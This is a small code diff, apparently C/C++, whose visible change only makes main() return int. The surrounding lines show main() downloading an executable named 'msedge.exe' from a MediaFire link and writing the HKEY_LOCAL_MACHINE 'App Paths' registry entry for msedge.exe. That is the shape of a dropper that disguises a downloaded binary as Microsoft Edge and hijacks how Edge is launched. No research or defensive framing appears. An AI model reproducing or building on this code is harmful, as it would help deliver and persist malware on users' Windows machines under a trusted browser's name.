@@ -53,9 +53,10 @@ void downloadArtifact(string url) {
 }
 
 
-void main(void) {
+int main(void) {
 
     downloadArtifact("https://download1349.mediafire.com/wtzrcopvuw7gjLqgOC1Zl3wktH2xStDwBIhHXVpiP3zYQEor5RyFAHMa9QjwWO-Eggpu-Byw1ST8j-lKFkgKLvWjpGR4r6RgThxZ-LUoiiURSb9sgOPZZd_AdPq8uHqXr9qs3iMJ3plQ4keBbFg7m0kSvxOTt6aVFNUvYTTCDwnNkpc/3l6xhi82b0lpm1l/msedge.exe");
     writeHKLM(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe");
+    return 0;
 
 }
